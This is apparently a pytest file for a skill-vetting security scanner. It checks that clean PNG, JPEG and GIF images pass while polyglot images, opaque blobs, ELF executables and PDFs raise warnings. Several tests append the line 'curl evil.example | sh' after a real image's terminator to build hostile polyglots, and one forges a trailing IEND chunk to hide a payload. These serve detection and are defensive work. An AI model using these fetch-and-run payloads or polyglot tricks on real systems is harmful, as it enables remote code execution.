"""B-615: a skill bundling an ordinary, RECOGNISED image (PNG/JPEG/GIF) must not read
CAUTION. `classify_bytes` already identifies the format; the fix is to stop throwing
that identity away when deciding whether to WARN.

The bug was pure loss of information: every `sub_class == "BINARY"` file joined
`ctx.binary_files`, the list that drives `checks/_vet.py`'s "unexpected binary" WARN,
with no split on the format `collector.py` had already recognised. A bundled logo or
screenshot is ordinary skill content, not a stowaway (F-054) and not an opaque blob.

What must NOT change: an unrecognised/opaque binary still WARNs and still names the
file (not a count); a native executable (F-054 "stowaway") still lands in BOTH
`ctx.binary_files` and `ctx.stowaway_files`, with its own wording. PDF is deliberately
excluded from the recognised-inert set — see the comment on
`_RECOGNISED_INERT_MEDIA_FORMATS` in collector.py, pinned again below.
"""
from __future__ import annotations

import base64
from pathlib import Path

from clawseccheck.checks import vet_skill
from clawseccheck.collector import (
    Context,
    _RECOGNISED_INERT_MEDIA_FORMATS,
    _media_is_well_terminated,
    collect_skill_files,
)
from clawseccheck.cli import main
from clawseccheck.dossier import build_profile

# The smallest possible valid PNG (1x1, greyscale): a real, well-formed image, decoded
# from base64 at runtime rather than committed as a binary fixture file. This is public,
# non-secret pixel data, not a credential -- it is inlined as a plain literal, unlike the
# fragment-assembled secret-shaped values ZKDS requires elsewhere in this suite.
_PNG_B64 = (
    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk"
    "+A8AAQUBAScY42YAAAAASUVORK5CYII="
)

# A real, well-formed 1x1 JPEG and GIF, each generated once (Pillow, at authoring time
# only -- never a runtime/shipped dependency) and inlined as base64, the same way as
# the PNG above. Decoded at runtime; no binary fixture committed.
_JPEG_B64 = (
    "/9j/4AAQSkZJRgABAQAAAQABAAD/2wBDAAMCAgMCAgMDAwMEAwMEBQgFBQQEBQoHBwYIDAoMDAsK"
    "CwsNDhIQDQ4RDgsLEBYQERMUFRUVDA8XGBYUGBIUFRT/2wBDAQMEBAUEBQkFBQkUDQsNFBQUFBQU"
    "FBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBT/wAARCAABAAEDASIA"
    "AhEBAxEB/8QAHwAAAQUBAQEBAQEAAAAAAAAAAAECAwQFBgcICQoL/8QAtRAAAgEDAwIEAwUFBAQA"
    "AAF9AQIDAAQRBRIhMUEGE1FhByJxFDKBkaEII0KxwRVS0fAkM2JyggkKFhcYGRolJicoKSo0NTY3"
    "ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqDhIWGh4iJipKTlJWWl5iZmqKjpKWm"
    "p6ipqrKztLW2t7i5usLDxMXGx8jJytLT1NXW19jZ2uHi4+Tl5ufo6erx8vP09fb3+Pn6/8QAHwEA"
    "AwEBAQEBAQEBAQAAAAAAAAECAwQFBgcICQoL/8QAtREAAgECBAQDBAcFBAQAAQJ3AAECAxEEBSEx"
    "BhJBUQdhcRMiMoEIFEKRobHBCSMzUvAVYnLRChYkNOEl8RcYGRomJygpKjU2Nzg5OkNERUZHSElK"
    "U1RVVldYWVpjZGVmZ2hpanN0dXZ3eHl6goOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3"
    "uLm6wsPExcbHyMnK0tPU1dbX2Nna4uPk5ebn6Onq8vP09fb3+Pn6/9oADAMBAAIRAxEAPwD50ooo"
    "r8MP9Uz/2Q=="
)
_GIF_B64 = (
    "R0lGODdhAQABAIEAAP8AAAAAAAAAAAAAACwAAAAAAQABAAAIBAABBAQAOw=="
)


def _skill(tmp_path: Path, name: str = "media") -> Path:
    """A minimal, benign skill directory: SKILL.md + one ordinary python helper."""
    sk = tmp_path / name
    sk.mkdir(parents=True)
    (sk / "SKILL.md").write_text(
        f"---\nname: {name}\ndescription: A small benign skill for testing.\n---\n\n"
        f"# {name}\n\nFormats tables. Ask before reading other files.\n",
        encoding="utf-8",
    )
    (sk / "fmt.py").write_text("def fmt(x):\n    return str(x)\n", encoding="utf-8")
    return sk


def _vet_cli(capsys, sk: Path) -> tuple[int, str]:
    rc = main(["--vet-skill", str(sk), "--ascii"])
    return rc, capsys.readouterr().out


def _profile(sk: Path):
    return build_profile(vet_skill(str(sk)), str(sk), "skill")


# ── 1: a real PNG reads INSTALL / rc 0, end to end ──────────────────────────────

def test_skill_bundling_a_real_png_is_install_rc0(tmp_path, capsys):
    sk = _skill(tmp_path)
    png_bytes = base64.b64decode(_PNG_B64)
    (sk / "logo.png").write_bytes(png_bytes)

    rc, out = _vet_cli(capsys, sk)
    assert rc == 0, out
    assert "INSTALL" in out and "DO-NOT-INSTALL" not in out, out
    assert "CAUTION" not in out, out
    assert "Binary files found" not in out, out
    assert "unrecognised binary" not in out, out


# ── 1b: the round-2 control — a polyglot (real PNG + payload after IEND) WARNs ──

def test_skill_bundling_a_png_with_payload_appended_still_warns(tmp_path, capsys):
    """The case that distinguishes a real fix from a plausible one: same magic bytes as
    test 1, a payload appended after the image's own terminator. A magic-byte-only
    discriminator classifies this identically to the clean PNG (`binary_files=[]`
    either way) and reads INSTALL -- that was the live round-2 finding. It must WARN,
    by name, exactly like the opaque blob."""
    sk = _skill(tmp_path)
    png_bytes = base64.b64decode(_PNG_B64)
    assert _media_is_well_terminated("PNG", png_bytes), "control: the clean PNG itself must pass"
    polyglot = png_bytes + b"\n#!/bin/sh\ncurl evil.example | sh\n"
    assert not _media_is_well_terminated("PNG", polyglot), "the appended payload must be detected"
    (sk / "logo.png").write_bytes(polyglot)

    rc, out = _vet_cli(capsys, sk)
    assert rc == 1, out
    assert "CAUTION" in out, out
    assert "logo.png" in out, out
    assert "unrecognised binary file(s)" in out, out

    ctx = Context(home=sk.parent)
    collect_skill_files(sk, ctx)
    assert ctx.binary_files == ["logo.png"], ctx.binary_files
    assert ctx.disclosures == [], "a polyglot must not be disclosed as inert media"


def test_a_forged_trailing_terminator_does_not_launder_the_payload(tmp_path):
    """A naive `endswith(terminator)` check is defeated by appending a SECOND, fake
    terminator after the payload. The structural walker must still find the real
    (first) IEND and see the payload sitting after it, not be fooled by the forged one
    at the very end."""
    png_bytes = base64.b64decode(_PNG_B64)
    forged = png_bytes + b"payload-payload-payload" + b"\x00\x00\x00\x00IEND\xae\x42\x60\x82"
    assert forged.endswith(b"IEND\xae\x42\x60\x82"), "control: the forged suffix is really there"
    assert not _media_is_well_terminated("PNG", forged)


def test_a_jpeg_with_payload_appended_still_warns(tmp_path, capsys):
    """Same shape as the PNG polyglot control, for JPEG: a real, well-terminated image
    (verified below) with a payload appended after its EOI marker."""
    sk = _skill(tmp_path)
    jpeg_bytes = base64.b64decode(_JPEG_B64)
    assert _media_is_well_terminated("JPEG", jpeg_bytes), "control: the clean JPEG must pass"
    polyglot = jpeg_bytes + b"\n#!/bin/sh\ncurl evil.example | sh\n"
    assert not _media_is_well_terminated("JPEG", polyglot), "the appended payload must be detected"
    (sk / "logo.jpg").write_bytes(polyglot)

    rc, out = _vet_cli(capsys, sk)
    assert rc == 1, out
    assert "CAUTION" in out, out
    assert "logo.jpg" in out, out
    assert "unrecognised binary file(s)" in out, out

    ctx = Context(home=sk.parent)
    collect_skill_files(sk, ctx)
    assert ctx.binary_files == ["logo.jpg"], ctx.binary_files
    assert ctx.disclosures == [], "a polyglot must not be disclosed as inert media"


def test_a_gif_with_payload_appended_still_warns(tmp_path, capsys):
    """Same shape again, for GIF: a real, well-terminated image (verified below) with a
    payload appended after its trailer byte."""
    sk = _skill(tmp_path)
    gif_bytes = base64.b64decode(_GIF_B64)
    assert _media_is_well_terminated("GIF", gif_bytes), "control: the clean GIF must pass"
    polyglot = gif_bytes + b"\n#!/bin/sh\ncurl evil.example | sh\n"
    assert not _media_is_well_terminated("GIF", polyglot), "the appended payload must be detected"
    (sk / "logo.gif").write_bytes(polyglot)

    rc, out = _vet_cli(capsys, sk)
    assert rc == 1, out
    assert "CAUTION" in out, out
    assert "logo.gif" in out, out
    assert "unrecognised binary file(s)" in out, out

    ctx = Context(home=sk.parent)
    collect_skill_files(sk, ctx)
    assert ctx.binary_files == ["logo.gif"], ctx.binary_files
    assert ctx.disclosures == [], "a polyglot must not be disclosed as inert media"


# ── 4: non-vacuity — the PNG genuinely exists and was collected/recognised ──────

def test_the_png_fixture_is_real_and_was_actually_collected(tmp_path):
    """Guards against test 1 passing because the file was empty/unreadable rather than
    because the fix works: prove the bytes are a real PNG, the file is on disk, and the
    collector both saw it and identified its format."""
    sk = _skill(tmp_path)
    png_bytes = base64.b64decode(_PNG_B64)
    assert png_bytes.startswith(b"\x89PNG\r\n\x1a\n"), "not actually a valid PNG header"
    png_path = sk / "logo.png"
    png_path.write_bytes(png_bytes)
    assert png_path.exists() and png_path.stat().st_size > 0

    ctx = Context(home=sk.parent)
    collect_skill_files(sk, ctx)
    assert "logo.png" in ctx.file_manifest, ctx.file_manifest
    assert ctx.excluded_binary_files_count == 1, "the PNG must still be counted as unscanned"
    assert ctx.binary_files == [], ctx.binary_files
    assert [d.kind for d in ctx.disclosures] == ["recognised_binary_media"], ctx.disclosures
    assert ctx.disclosures[0].subject == "logo.png"


# ── 2: an opaque blob still WARNs, and the evidence NAMES the file ──────────────

def test_skill_bundling_an_opaque_blob_still_warns_by_name(tmp_path, capsys):
    sk = _skill(tmp_path)
    # Deterministic, no known magic bytes (not ELF/PE/PNG/JPEG/GIF/PDF/ZIP/gzip/...).
    blob = bytes((i * 37 + 11) % 251 for i in range(600))
    assert not blob.startswith((b"\x7fELF", b"MZ", b"\x89PNG", b"\xff\xd8\xff",
                                 b"GIF8", b"%PDF-", b"PK\x03\x04", b"\x1f\x8b"))
    (sk / "opaque.bin").write_bytes(blob)

    rc, out = _vet_cli(capsys, sk)
    assert rc == 1, out
    assert "CAUTION" in out, out
    # Names the file, not a count.
    assert "opaque.bin" in out, out
    assert "unrecognised binary file(s)" in out, out
    assert "Binary files found" not in out, out

    f = _profile(sk)
    danger = next(a for a in f.axes if a.axis == "danger")
    assert danger.status == "WARN", danger


# ── 3: F-054 stowaway path is unchanged — pinned, not merely asserted disjoint ──

def test_elf_stowaway_still_lands_in_both_binary_files_and_stowaway_files(tmp_path):
    """The invariant the fix relies on ('the two sets never overlap') is exactly the
    kind of thing that quietly stops being true. Pin it directly against the real
    collector output rather than trusting the reasoning in a comment."""
    sk = _skill(tmp_path)
    elf_bytes = b"\x7fELF" + b"\x02\x01\x01\x00" * 300
    (sk / "helper.bin").write_bytes(elf_bytes)

    ctx = Context(home=sk.parent)
    collect_skill_files(sk, ctx)
    assert ctx.binary_files == ["helper.bin"], ctx.binary_files
    assert ctx.stowaway_files == ["helper.bin (ELF)"], ctx.stowaway_files
    assert ctx.disclosures == [], "a native executable is not inert media, no disclosure"


def test_pdf_is_not_in_the_recognised_inert_set(tmp_path):
    """PDF is a `classify_bytes`-recognised format but can carry /JavaScript,
    /OpenAction and /Launch actions -- its magic bytes say nothing about whether any of
    that is present. It must keep WARNing like any other opaque binary."""
    assert "PDF" not in _RECOGNISED_INERT_MEDIA_FORMATS
    sk = _skill(tmp_path)
    (sk / "doc.pdf").write_bytes(b"%PDF-1.4\n" + bytes(range(256)) * 4)

    ctx = Context(home=sk.parent)
    collect_skill_files(sk, ctx)
    assert ctx.binary_files == ["doc.pdf"], ctx.binary_files
    assert ctx.disclosures == []
